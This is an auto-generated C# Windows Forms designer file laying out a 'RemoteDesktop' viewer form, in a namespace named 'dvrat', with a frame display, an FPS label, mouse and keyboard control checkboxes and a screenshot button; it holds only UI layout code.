
namespace dvrat
{
    partial class RemoteDesktop
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.FrameHandler = new System.Windows.Forms.PictureBox();
            this.fps_label = new System.Windows.Forms.Label();
            this.groupBox1 = new System.Windows.Forms.GroupBox();
            this.keyboard_checkBox = new System.Windows.Forms.CheckBox();
            this.mouse_checkBox = new System.Windows.Forms.CheckBox();
            this.Screenshot_button = new System.Windows.Forms.Button();
            this.handle_label = new System.Windows.Forms.Label();
            this.close_label = new System.Windows.Forms.Label();
            this.title_label = new System.Windows.Forms.Label();
            ((System.ComponentModel.ISupportInitialize)(this.FrameHandler)).BeginInit();
            this.groupBox1.SuspendLayout();
            this.SuspendLayout();
            // 
            // FrameHandler
            // 
            this.FrameHandler.Location = new System.Drawing.Point(12, 18);
            this.FrameHandler.Name = "FrameHandler";
            this.FrameHandler.Size = new System.Drawing.Size(616, 373);
            this.FrameHandler.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.FrameHandler.TabIndex = 0;
            this.FrameHandler.TabStop = false;
            this.FrameHandler.Click += new System.EventHandler(this.FrameHandler_Click);
            this.FrameHandler.MouseDown += new System.Windows.Forms.MouseEventHandler(this.FrameHandler_MouseDown);
            this.FrameHandler.MouseMove += new System.Windows.Forms.MouseEventHandler(this.FrameHandler_MouseMove);
            this.FrameHandler.MouseUp += new System.Windows.Forms.MouseEventHandler(this.FrameHandler_MouseUp);
            // 
            // fps_label
            // 
            this.fps_label.AutoSize = true;
            this.fps_label.BackColor = System.Drawing.Color.Transparent;
            this.fps_label.ForeColor = System.Drawing.Color.Red;
            this.fps_label.Location = new System.Drawing.Point(16, 19);
            this.fps_label.Name = "fps_label";
            this.fps_label.Size = new System.Drawing.Size(50, 13);
            this.fps_label.TabIndex = 1;
            this.fps_label.Text = "FPS: N/A";
            // 
            // groupBox1
            // 
            this.groupBox1.BackColor = System.Drawing.Color.Black;
            this.groupBox1.Controls.Add(this.keyboard_checkBox);
            this.groupBox1.Controls.Add(this.mouse_checkBox);
            this.groupBox1.ForeColor = System.Drawing.Color.White;
            this.groupBox1.Location = new System.Drawing.Point(214, 395);
            this.groupBox1.Name = "groupBox1";
            this.groupBox1.Size = new System.Drawing.Size(154, 74);
            this.groupBox1.TabIndex = 2;
            this.groupBox1.TabStop = false;
            this.groupBox1.Text = "Input Control";
            // 
            // keyboard_checkBox
            // 
            this.keyboard_checkBox.AutoSize = true;
            this.keyboard_checkBox.Location = new System.Drawing.Point(7, 42);
            this.keyboard_checkBox.Name = "keyboard_checkBox";
            this.keyboard_checkBox.Size = new System.Drawing.Size(72, 17);
            this.keyboard_checkBox.TabIndex = 1;
            this.keyboard_checkBox.Text = "KeyBoard";
            this.keyboard_checkBox.UseVisualStyleBackColor = true;
            // 
            // mouse_checkBox
            // 
            this.mouse_checkBox.AutoSize = true;
            this.mouse_checkBox.Location = new System.Drawing.Point(7, 19);
            this.mouse_checkBox.Name = "mouse_checkBox";
            this.mouse_checkBox.Size = new System.Drawing.Size(57, 17);
            this.mouse_checkBox.TabIndex = 0;
            this.mouse_checkBox.Text = "mouse";
            this.mouse_checkBox.UseVisualStyleBackColor = true;
            // 
            // Screenshot_button
            // 
            this.Screenshot_button.BackColor = System.Drawing.Color.Black;
            this.Screenshot_button.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.Screenshot_button.Location = new System.Drawing.Point(74, 398);
            this.Screenshot_button.Name = "Screenshot_button";
            this.Screenshot_button.Size = new System.Drawing.Size(105, 74);
            this.Screenshot_button.TabIndex = 3;
            this.Screenshot_button.Text = "ScreenShot";
            this.Screenshot_button.UseVisualStyleBackColor = false;
            this.Screenshot_button.Click += new System.EventHandler(this.Screenshot_button_Click);
            // 
            // handle_label
            // 
            this.handle_label.Location = new System.Drawing.Point(-10, -6);
            this.handle_label.Name = "handle_label";
            this.handle_label.Size = new System.Drawing.Size(615, 19);
            this.handle_label.TabIndex = 0;
            this.handle_label.Click += new System.EventHandler(this.handle_label_Click);
            this.handle_label.MouseDown += new System.Windows.Forms.MouseEventHandler(this.handle_label_MouseDown);
            // 
            // close_label
            // 
            this.close_label.AutoSize = true;
            this.close_label.Cursor = System.Windows.Forms.Cursors.Hand;
            this.close_label.Font = new System.Drawing.Font("Tahoma", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.close_label.ForeColor = System.Drawing.Color.Red;
            this.close_label.Location = new System.Drawing.Point(616, 2);
            this.close_label.Name = "close_label";
            this.close_label.Size = new System.Drawing.Size(14, 13);
            this.close_label.TabIndex = 5;
            this.close_label.Text = "X";
            this.close_label.Click += new System.EventHandler(this.close_label_Click);
            // 
            // title_label
            // 
            this.title_label.AutoSize = true;
            this.title_label.Location = new System.Drawing.Point(16, 2);
            this.title_label.Name = "title_label";
            this.title_label.Size = new System.Drawing.Size(27, 13);
            this.title_label.TabIndex = 6;
            this.title_label.Text = "Title";
            // 
            // RemoteDesktop
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.Black;
            this.ClientSize = new System.Drawing.Size(640, 477);
            this.Controls.Add(this.title_label);
            this.Controls.Add(this.handle_label);
            this.Controls.Add(this.close_label);
            this.Controls.Add(this.Screenshot_button);
            this.Controls.Add(this.groupBox1);
            this.Controls.Add(this.fps_label);
            this.Controls.Add(this.FrameHandler);
            this.ForeColor = System.Drawing.Color.White;
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Name = "RemoteDesktop";
            this.Text = "RemoteDesktop";
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.RemoteDesktop_FormClosing);
            this.FormClosed += new System.Windows.Forms.FormClosedEventHandler(this.RemoteDesktop_FormClosed);
            this.Load += new System.EventHandler(this.RemoteDesktop_Load);
            ((System.ComponentModel.ISupportInitialize)(this.FrameHandler)).EndInit();
            this.groupBox1.ResumeLayout(false);
            this.groupBox1.PerformLayout();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.PictureBox FrameHandler;
        private System.Windows.Forms.Label fps_label;
        private System.Windows.Forms.GroupBox groupBox1;
        private System.Windows.Forms.CheckBox keyboard_checkBox;
        private System.Windows.Forms.CheckBox mouse_checkBox;
        private System.Windows.Forms.Button Screenshot_button;
        private System.Windows.Forms.Label handle_label;
        private System.Windows.Forms.Label close_label;
        private System.Windows.Forms.Label title_label;
    }
}